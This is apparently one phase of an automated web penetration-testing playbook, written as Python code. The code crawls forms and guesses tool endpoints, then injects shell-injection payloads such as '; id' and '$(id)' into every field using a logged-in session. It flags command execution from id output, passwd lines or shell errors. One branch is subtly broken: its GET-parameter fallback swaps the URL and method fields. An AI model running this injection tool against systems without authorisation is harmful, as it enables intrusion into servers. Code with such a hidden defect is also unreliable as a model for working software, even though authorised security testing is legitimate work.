**Phase 10 — Command Injection**

  Test ALL forms for command injection. Run as ONE complete block.
  Uses authenticated session — many CMDi endpoints require login.

  IMPORTANT: Command injection can be in ANY form field, not just params named "host" or "target".
  Test ALL text inputs on ALL crawled forms, plus probe common network-tool paths.
  Use the AUTHENTICATED session — many CMDi endpoints require login (e.g. /tools).

  ```python
  import time, re as _re
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  # MUST use authenticated session — network tool pages often require login
  cmdi_session = _G.get('session_a') or _G.get('session')
  if cmdi_session is None:
      import requests as _req
      cmdi_session = _req.Session()
      cmdi_session.verify = False
      cmdi_session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  print(f'[CMDi] Using session: {"authenticated" if _G.get("session_a") or _G.get("session") else "unauthenticated"}')

  _CMDI_KEYWORDS = ['ping', 'lookup', 'nslookup', 'traceroute', 'whois', 'dig',
                    'exec', 'execute', 'run', 'cmd', 'command', 'tool', 'network',
                    'check', 'scan', 'resolve', 'diag', 'util']

  _CMDI_PATHS = [
      '/ping', '/tools', '/tools/ping', '/network', '/network/ping',
      '/network/lookup', '/lookup', '/nslookup', '/traceroute', '/whois',
      '/exec', '/execute', '/run', '/cmd', '/command', '/admin/ping',
      '/api/ping', '/api/lookup', '/api/exec', '/api/network', '/api/tools',
      '/util', '/utils', '/diagnostics', '/debug', '/test',
  ]

  _CMDI_PAYLOADS = [
      '127.0.0.1; id',
      '127.0.0.1 | id',
      '127.0.0.1 && id',
      '; id',
      '| id',
      '`id`',
      '$(id)',
      '& id',
      '|| id',
      ';id;',
  ]

  # ── Step 1: Collect ALL forms from crawl that might be CMDi targets ──────────
  # Source A: Forms from authenticated crawl (AUTH_FORMS)
  # Source B: Forms from unauthenticated spider (ALL_FORMS)
  # Source C: Direct probing of common CMDi paths
  AUTH_FORMS = _G.get('AUTH_FORMS', [])
  ALL_FORMS  = _G.get('ALL_FORMS', [])
  AUTH_PAGES = _G.get('AUTH_PAGES', {})
  ALL_PAGES  = _G.get('ALL_PAGES', {})

  # Collect ALL forms from crawl — test every text field for CMDi
  # Do NOT filter by keyword — any form can be vulnerable
  cmdi_forms = []  # list of (url, method, field_names, extra_data)

  for form in AUTH_FORMS + ALL_FORMS:
      action = form.get('action', BASE)
      url = action if action.startswith('http') else urljoin(BASE, action)
      method = form.get('method', 'get').lower()
      fields = form.get('fields', [])

      field_names = []
      extra_data = {}
      for f in fields:
          fname = f.get('name', '')
          ftype = f.get('type', 'text').lower()
          if not fname or ftype in ('submit', 'button'):
              continue
          if ftype == 'hidden':
              extra_data[fname] = f.get('value', '')
          elif ftype in ('checkbox', 'radio', 'file'):
              extra_data[fname] = f.get('value', '')
          else:
              field_names.append(fname)

      if field_names:
          cmdi_forms.append((url, method, field_names, extra_data))

  # ── Step 2: Probe common CMDi paths not in crawl ─────────────────────────────
  crawled_urls = set(list(AUTH_PAGES.keys()) + list(ALL_PAGES.keys()))
  from bs4 import BeautifulSoup as _BS4

  for p in _CMDI_PATHS:
      endpoint = BASE.rstrip('/') + p
      if endpoint in crawled_urls:
          continue  # already in crawl, forms already collected above
      time.sleep(0.2)
      try:
          probe = cmdi_session.get(endpoint, timeout=8, verify=False)
      except Exception:
          continue
      if probe.status_code in (404, 410):
          continue
      if 'login' in probe.url and 'login' not in endpoint:
          print(f'[CMDi] {endpoint} → needs auth (redirected to login)')
          continue
      print(f'[CMDi] Probed: {endpoint} ({probe.status_code})')

      soup = _BS4(probe.text, 'html.parser')
      for form in soup.find_all('form'):
          action = form.get('action', '')
          method = form.get('method', 'get').lower()
          form_url = action if action.startswith('http') else urljoin(endpoint, action or p)
          field_names = []
          extra_data = {}
          for inp in form.find_all(['input', 'select', 'textarea']):
              n = inp.get('name', '')
              if not n:
                  continue
              tag = inp.name.lower()
              itype = inp.get('type', 'text').lower()
              if itype in ('submit', 'button'):
                  continue
              elif itype == 'hidden':
                  extra_data[n] = inp.get('value', '')
              elif tag == 'select':
                  first_opt = inp.find('option')
                  extra_data[n] = first_opt.get('value', '') if first_opt else ''
              else:
                  field_names.append(n)
          if field_names:
              cmdi_forms.append((form_url, method, field_names, extra_data))

      # No form found — try GET params
      if not soup.find_all('form'):
          cmdi_forms.append(('get', endpoint,
              ['target', 'host', 'ip', 'addr', 'cmd', 'command', 'q', 'input'], {}))

  # Dedup
  seen = set()
  unique_forms = []
  for entry in cmdi_forms:
      key = (entry[0], tuple(entry[2]))
      if key not in seen:
          seen.add(key)
          unique_forms.append(entry)
  cmdi_forms = unique_forms

  print(f'[CMDi] {len(cmdi_forms)} forms/endpoints to test')

  # ── Step 3: Inject into EVERY text field on candidate forms ──────────────────
  cmdi_findings = []

  for (test_url, method, field_names, extra_data) in cmdi_forms:
      print(f'  Testing: {method.upper()} {test_url}  fields={field_names}')
      for param in field_names:
          for payload in _CMDI_PAYLOADS:
              time.sleep(0.3)
              data = dict(extra_data)
              data[param] = payload
              try:
                  if method == 'post':
                      r = cmdi_session.post(test_url, data=data, timeout=10, verify=False)
                  else:
                      r = cmdi_session.get(test_url, params=data, timeout=10, verify=False)
              except Exception as e:
                  print(f'  [ERROR] {param}={repr(payload)}: {e}')
                  continue

              body = r.text
              cmdi_hit = False

              # Check for command execution evidence (multiple patterns)
              if _re.search(r'uid=\d+\([a-z_]+\)', body):
                  print(f'[CRITICAL] CMDi CONFIRMED (id output) at {test_url}')
                  print(f'  Param: {param!r}  Payload: {payload!r}')
                  print(f'  Evidence: {_re.search(r"uid=.{{0,50}}", body).group()}')
                  cmdi_hit = True
              elif _re.search(r'(root|www-data|apache|nginx|nobody):.*:/bin/', body):
                  print(f'[CRITICAL] CMDi CONFIRMED (passwd echo) at {test_url}')
                  print(f'  Param: {param!r}  Payload: {payload!r}')
                  cmdi_hit = True
              elif _re.search(r'(gid=\d+|groups=\d+|euid=\d+)', body):
                  print(f'[CRITICAL] CMDi CONFIRMED (id groups) at {test_url}')
                  print(f'  Param: {param!r}  Payload: {payload!r}')
                  cmdi_hit = True
              else:
                  # Baseline comparison: if response with payload differs significantly
                  # from normal response AND contains shell-like output
                  _shell_signs = ['command not found', 'sh:', 'bash:', '/usr/', '/bin/',
                                  'Permission denied', 'cannot access', 'No such file']
                  if any(s in body for s in _shell_signs):
                      print(f'[HIGH] CMDi LIKELY (shell error) at {test_url}')
                      print(f'  Param: {param!r}  Payload: {payload!r}')
                      print(f'  Evidence: {body[:300]}')
                      cmdi_hit = True

              if cmdi_hit:
                  cmdi_findings.append({
                      'url': test_url, 'param': param,
                      'payload': payload, 'method': method.upper(),
                      'evidence': body[:500],
                  })
                  break  # confirmed — move to next param
          if cmdi_findings and cmdi_findings[-1].get('url') == test_url:
              break  # found on this endpoint

  # ── Step 4: Test URL parameters from crawl ────────────────────────────────
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])
  print(f'\n[CMDi] Testing {len(AUTH_PARAMS)} URL params from crawl')
  for param_info in AUTH_PARAMS:
      purl = param_info['url'].split('?')[0]
      pname = param_info['param']
      for payload in _CMDI_PAYLOADS[:5]:  # top 5 payloads
          time.sleep(0.3)
          try:
              r = cmdi_session.get(purl, params={pname: payload}, timeout=10, verify=False)
          except Exception:
              continue
          body = r.text
          if _re.search(r'uid=\d+\([a-z_]+\)', body) or \
             _re.search(r'(root|www-data|apache|nginx|nobody):.*:/bin/', body):
              print(f'[CRITICAL] CMDi CONFIRMED via URL param: {purl}?{pname}=')
              print(f'  Payload: {payload}')
              cmdi_findings.append({'url': purl, 'param': pname, 'payload': payload,
                                    'method': 'GET', 'evidence': body[:500]})
              break

  if cmdi_findings:
      _G['CMDI_FINDINGS'] = cmdi_findings
      _G.setdefault('FINDINGS', [])
      for cf in cmdi_findings:
          _G['FINDINGS'].append({
              'severity': 'CRITICAL',
              'title': f"Command Injection — {cf['param']} param",
              'url': cf['url'],
              'detail': cf,
          })
      print(f'\n[CRITICAL] Command Injection found on {len(cmdi_findings)} endpoint(s)!')
  else:
      print('[INFO] No command injection found')
      print('  Tested: ' + ', '.join(f[0] for f in cmdi_forms)[:300])
  ```
